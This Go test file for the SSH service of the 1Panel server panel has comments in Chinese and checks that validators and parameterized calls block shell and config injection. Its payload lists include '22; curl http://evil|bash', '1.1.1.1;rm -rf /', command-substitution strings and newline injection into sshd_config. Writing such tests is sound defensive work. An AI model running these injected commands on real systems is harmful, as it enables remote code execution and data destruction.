package service

import (
	"compress/gzip"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/1Panel-dev/1Panel/backend/app/dto"
	"github.com/1Panel-dev/1Panel/backend/buserr"
	"github.com/1Panel-dev/1Panel/backend/constant"
	"github.com/pkg/errors"
)

func TestBuildSSHKeygenArgs(t *testing.T) {
	secretFile := "/home/test/.ssh/id_item_rsa"

	t.Run("no password omits -N", func(t *testing.T) {
		args := buildSSHKeygenArgs(secretFile, "rsa", "")
		want := []string{"-t", "rsa", "-f", secretFile}
		if !reflect.DeepEqual(args, want) {
			t.Fatalf("unexpected args: got %v, want %v", args, want)
		}
		for _, a := range args {
			if a == "-N" {
				t.Fatalf("args should not contain -N when password is empty: %v", args)
			}
		}
	})

	t.Run("password kept as single argv after -N", func(t *testing.T) {
		password := "my pass with spaces -and-hyphens"
		args := buildSSHKeygenArgs("/tmp/key/id_item_ed25519", "ed25519", password)
		want := []string{"-t", "ed25519", "-f", "/tmp/key/id_item_ed25519", "-N", password}
		if !reflect.DeepEqual(args, want) {
			t.Fatalf("unexpected args: got %v, want %v", args, want)
		}
		if args[len(args)-1] != password {
			t.Fatalf("password not a single argv: got %q", args[len(args)-1])
		}
	})

	t.Run("malicious password is not expanded into args", func(t *testing.T) {
		// 恶意密码：若经过 shell 拼接会被解释为 `-f /tmp/pwned` 额外参数。
		password := "x -f /tmp/pwned"
		args := buildSSHKeygenArgs(secretFile, "rsa", password)

		nIdx := -1
		for i, a := range args {
			if a == "-N" {
				nIdx = i
			}
			if a == "/tmp/pwned" {
				t.Fatalf("malicious password split into its own argv element: %v", args)
			}
		}
		if nIdx == -1 {
			t.Fatalf("-N not found in args: %v", args)
		}
		if nIdx+1 >= len(args) || args[nIdx+1] != password {
			t.Fatalf("malicious password must be the single value of -N: %v", args)
		}
		// 除 -N 的值外，不应出现任何来自密码的片段。
		for i, a := range args {
			if i == nIdx+1 {
				continue
			}
			if strings.Contains(a, "/tmp/pwned") {
				t.Fatalf("password fragment leaked into another argv element %q: %v", a, args)
			}
		}
	})
}

// TestSSHKeygenPassphraseActsAsNewKeyPassword 集成验证 -N 的语义：
// 生成的密钥使用给定密码做 passphrase——错误密码无法解锁，正确密码可以。
// 不依赖 user.Current()/HOME，直接通过 buildSSHKeygenArgs + exec.Command 复现修复后的调用方式。
func TestSSHKeygenPassphraseActsAsNewKeyPassword(t *testing.T) {
	if _, err := exec.LookPath("ssh-keygen"); err != nil {
		t.Skip("ssh-keygen not available in environment, skipping integration test")
	}

	secretFile := filepath.Join(t.TempDir(), "id_item_ed25519")
	secretPubFile := secretFile + ".pub"
	for _, stale := range []string{secretFile, secretPubFile} {
		if err := os.Remove(stale); err != nil && !os.IsNotExist(err) {
			t.Fatalf("remove stale file: %v", err)
		}
	}

	password := "pass with spaces -and dash"
	keygen := exec.Command("ssh-keygen", buildSSHKeygenArgs(secretFile, "ed25519", password)...)
	if out, err := keygen.CombinedOutput(); err != nil {
		t.Fatalf("ssh-keygen failed: %v, out: %s", err, out)
	}
	if _, err := os.Stat(secretFile); err != nil {
		t.Fatalf("private key not generated: %v", err)
	}
	if _, err := os.Stat(secretPubFile); err != nil {
		t.Fatalf("public key not generated: %v", err)
	}

	// 错误密码应被拒绝 => 证明 passphrase 真的生效（原 -P 语义下无效）。
	wrong := exec.Command("ssh-keygen", "-y", "-f", secretFile, "-P", "wrong")
	if out, err := wrong.CombinedOutput(); err == nil {
		t.Fatalf("expected wrong passphrase to be rejected, out: %s", out)
	}
	// 正确密码应能解锁。
	right := exec.Command("ssh-keygen", "-y", "-f", secretFile, "-P", password)
	if out, err := right.CombinedOutput(); err != nil {
		t.Fatalf("correct passphrase should unlock key: %v, out: %s", err, out)
	}
}

// TestSSHKeygenNoShellInjection 集成验证恶意密码不会造成额外的文件写入
// （复现修复前通过 bash -c 拼接时可写入任意路径，此处验证参数化后无法做到）。
func TestSSHKeygenNoShellInjection(t *testing.T) {
	if _, err := exec.LookPath("ssh-keygen"); err != nil {
		t.Skip("ssh-keygen not available in environment, skipping integration test")
	}

	baseDir := t.TempDir()
	secretFile := filepath.Join(baseDir, "id_item_rsa")
	pwned := filepath.Join(baseDir, "pwned")

	// 若被 shell 解释，`-f <pwned>` 会让 ssh-keygen 覆盖 <pwned> 文件。
	password := "x -f " + pwned
	keygen := exec.Command("ssh-keygen", buildSSHKeygenArgs(secretFile, "rsa", password)...)
	if out, err := keygen.CombinedOutput(); err != nil {
		t.Fatalf("ssh-keygen failed: %v, out: %s", err, out)
	}
	if _, err := os.Stat(pwned); err == nil {
		t.Fatalf("malicious password was interpreted as extra ssh-keygen args, pwned file was created: %q", password)
	}
	if _, err := os.Stat(secretFile); err != nil {
		t.Fatalf("key not generated at intended path: %v", err)
	}
}

// assertErrCmdIllegal 断言 err 为 buserr.New(constant.ErrCmdIllegal)。
func assertErrCmdIllegal(t *testing.T, err error) {
	t.Helper()
	if err == nil {
		t.Fatalf("expected ErrCmdIllegal, got nil")
	}
	var busErr buserr.BusinessError
	if !errors.As(err, &busErr) {
		t.Fatalf("expected buserr.BusinessError, got %T: %v", err, err)
	}
	if busErr.Msg != constant.ErrCmdIllegal {
		t.Fatalf("expected %s, got %s", constant.ErrCmdIllegal, busErr.Msg)
	}
}

// TestCheckSSHLogSearchInfo 直接测试校验函数：不依赖 /var/log 等机器状态，
// 良性关键字（含空串）必须放行，含 shell 元字符的恶意关键字必须拒绝。
func TestCheckSSHLogSearchInfo(t *testing.T) {
	t.Run("benign info is allowed", func(t *testing.T) {
		for _, info := range []string{"", "192.168.1.10", "root", "Failed password"} {
			if err := checkSSHLogSearchInfo(info); err != nil {
				t.Fatalf("info %q should be allowed, got err: %v", info, err)
			}
		}
	})

	t.Run("malicious info is rejected", func(t *testing.T) {
		payloads := []string{
			"' ; id ; '",             // 闭合单引号 + 分号
			"192.168.1.10' ; id ; '", // 良性前缀 + 注入
			"a | b",                  // 管道
			"$(id)",                  // 命令替换
			"`id`",                   // 反引号
			"line1\nline2",           // 换行
			"line1\rline2",           // 回车
			">/tmp/pwned",            // 重定向
			"</tmp/pwned",            // 重定向
			"a & b",                  // 后台执行
			`he"llo`,                 // 双引号
		}
		for _, p := range payloads {
			assertErrCmdIllegal(t, checkSSHLogSearchInfo(p))
		}
	})
}

// TestCheckSSHUpdateParams 直接测试 Update 的 Key/NewValue 白名单校验函数：
// 不依赖 sshd/systemctl 等机器状态。Update 入口先调用该校验，再写文件与执行
// semanage/防火墙联动，因此恶意值不会触达任何命令拼接或配置写入。
func TestCheckSSHUpdateParams(t *testing.T) {
	t.Run("valid port values are allowed", func(t *testing.T) {
		for _, v := range []string{"1", "22", "2222", "65535"} {
			if err := checkSSHUpdateParams("Port", v); err != nil {
				t.Fatalf("Port %q should be allowed, got err: %v", v, err)
			}
		}
	})

	t.Run("port injection and out-of-range values are rejected", func(t *testing.T) {
		payloads := []string{
			"22; curl http://evil|bash",  // 命令注入（semanage 拼接）
			"22 && touch /tmp/pwned",     // 命令注入
			"99999",                      // 超出端口范围
			"0",                          // 超出端口范围
			"-1",                         // 负数
			"abc",                        // 非数字
			"22 ",                        // 尾随空格
			"2222\nPort 1337",            // 换行注入 sshd_config 指令
			"2222\r\nPermitRootLogin no", // 回车换行注入
			"22\x00",                     // NUL
			"22\t",                       // 制表符（控制字符）
		}
		for _, v := range payloads {
			assertErrCmdIllegal(t, checkSSHUpdateParams("Port", v))
		}
	})

	t.Run("yes/no keys accept lowercase yes and no only", func(t *testing.T) {
		for _, key := range []string{"PasswordAuthentication", "PubkeyAuthentication", "UseDNS"} {
			for _, v := range []string{"yes", "no"} {
				if err := checkSSHUpdateParams(key, v); err != nil {
					t.Fatalf("%s=%q should be allowed, got err: %v", key, v, err)
				}
			}
		}
	})

	t.Run("yes/no keys reject other forms", func(t *testing.T) {
		// sshd 本身对 yes/no 大小写不敏感，但面板前端仅提交小写 yes/no，
		// 此处按最严格口径收口（见修复报告说明）。
		payloads := []string{"YES", "Yes", "NO", "1", "0", "true", "", "yes no", "yes\n"}
		for _, key := range []string{"PasswordAuthentication", "PubkeyAuthentication", "UseDNS"} {
			for _, v := range payloads {
				assertErrCmdIllegal(t, checkSSHUpdateParams(key, v))
			}
		}
	})

	t.Run("PermitRootLogin accepts sshd legal values used by panel", func(t *testing.T) {
		for _, v := range []string{"yes", "no", "without-password", "prohibit-password", "forced-commands-only"} {
			if err := checkSSHUpdateParams("PermitRootLogin", v); err != nil {
				t.Fatalf("PermitRootLogin=%q should be allowed, got err: %v", v, err)
			}
		}
		assertErrCmdIllegal(t, checkSSHUpdateParams("PermitRootLogin", "maybe"))
	})

	t.Run("ListenAddress accepts valid IPs and empty value", func(t *testing.T) {
		for _, v := range []string{
			"",
			"192.168.1.10",
			"0.0.0.0",
			"::",
			"192.168.1.10,10.0.0.1", // 多地址（updateSSHConf 按逗号拆分为多行）
			"0.0.0.0,::",
			"2001:db8::1",
		} {
			if err := checkSSHUpdateParams("ListenAddress", v); err != nil {
				t.Fatalf("ListenAddress=%q should be allowed, got err: %v", v, err)
			}
		}
	})

	t.Run("ListenAddress rejects invalid and injected values", func(t *testing.T) {
		payloads := []string{
			"evil; touch /tmp/pwned",              // 命令注入
			"1.1.1.1;rm -rf /",                    // 命令注入
			"192.168.1.10\nListenAddress 0.0.0.0", // 换行注入
			"192.168.1.10;1.1.1.1",                // 分号分隔（合法分隔符仅为逗号）
			"999.999.1.1",                         // 非法 IPv4
			"192.168.1.0/24",                      // sshd ListenAddress 不接受网段写法
			"example.com",                         // 域名不做放行
		}
		for _, v := range payloads {
			assertErrCmdIllegal(t, checkSSHUpdateParams("ListenAddress", v))
		}
	})

	t.Run("keys outside whitelist are rejected", func(t *testing.T) {
		for _, key := range []string{"Ciphers", "AllowUsers", "Subsystem", "port", "Port ", "", "Match"} {
			assertErrCmdIllegal(t, checkSSHUpdateParams(key, "harmless-looking-value"))
		}
	})
}

// TestUpdateRejectsMaliciousParams 端到端验证：Update 入口处即拒绝恶意 Key/NewValue，
// 不会执行到读取/写入 /etc/ssh/sshd_config、semanage 或防火墙逻辑
// （校验为 Update 第一条语句，返回结果是确定性的）。
func TestUpdateRejectsMaliciousParams(t *testing.T) {
	u := &SSHService{}
	reqs := []dto.SSHUpdate{
		{Key: "Port", NewValue: "22; curl http://evil|bash"},
		{Key: "Port", NewValue: "99999"},
		{Key: "Port", NewValue: "2222\nPermitRootLogin no"},
		{Key: "Ciphers", NewValue: "aes128-ctr"},
	}
	for _, req := range reqs {
		assertErrCmdIllegal(t, u.Update(req))
	}
}

// TestLoadLogRejectsMaliciousInfo 端到端验证：恶意 Info 在进入任何文件遍历/命令
// 构造之前即被拒绝，且不会在磁盘上产生任何注入副作用（pwned 文件不被创建）。
// 校验位于 LoadLog 入口，因此在 filepath.Walk 之前返回，测试结果是确定性的。
func TestLoadLogRejectsMaliciousInfo(t *testing.T) {
	u := &SSHService{}
	baseDir := t.TempDir()
	pwned := filepath.Join(baseDir, "pwned")

	payloads := []string{
		"'; touch " + pwned + "; '",
		"$(touch " + pwned + ")",
		"`touch " + pwned + "`",
		"' > " + pwned + " ; '",
	}
	for _, p := range payloads {
		req := dto.SearchSSHLog{
			PageInfo: dto.PageInfo{Page: 1, PageSize: 10},
			Info:     p,
			Status:   "All",
		}
		data, err := u.LoadLog(nil, req)
		assertErrCmdIllegal(t, err)
		if data != nil {
			t.Fatalf("expected nil data on rejection, got %+v", data)
		}
		if _, statErr := os.Stat(pwned); statErr == nil {
			t.Fatalf("malicious info caused a file side effect, %s was created: %q", pwned, p)
		}
	}
}

// writeTestGz 生成一个 gzip 压缩文件，用于验证 handleGunzip 的执行行为。
func writeTestGz(t *testing.T, dir, name, content string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create %s: %v", path, err)
	}
	defer f.Close()
	gz := gzip.NewWriter(f)
	if _, err := gz.Write([]byte(content)); err != nil {
		t.Fatalf("gzip write: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("gzip close: %v", err)
	}
	return path
}

// TestHandleGunzipParameterized 验证 handleGunzip 使用参数化 argv 执行
// （exec.Command("gunzip", path)，无 shell）：文件名含空格或 shell
// 元字符时，旧实现 `gunzip %s`（bash -c 未加引号）会因分词/展开而失败或
// 触发注入，参数化后按字面路径处理，正常解压。
func TestHandleGunzipParameterized(t *testing.T) {
	dir := t.TempDir()
	cases := []struct {
		name    string
		content string
	}{
		{name: "log file.log.gz", content: "secure log with spaces\n"},
		{name: "auth$(id).log.gz", content: "auth log, command substitution stays literal\n"},
		{name: "messages;a;id.log.gz", content: "messages log, semicolon stays literal\n"},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			gzPath := writeTestGz(t, dir, tt.name, tt.content)
			outPath := strings.TrimSuffix(gzPath, ".gz")
			if err := handleGunzip(gzPath); err != nil {
				t.Fatalf("handleGunzip(%q) failed: %v", gzPath, err)
			}
			data, err := os.ReadFile(outPath)
			if err != nil {
				t.Fatalf("decompressed file %q missing: %v", outPath, err)
			}
			if string(data) != tt.content {
				t.Fatalf("decompressed content = %q, want %q", string(data), tt.content)
			}
			if _, err := os.Stat(gzPath); !os.IsNotExist(err) {
				t.Fatalf("gunzip should have removed the .gz file: %v", err)
			}
		})
	}
}
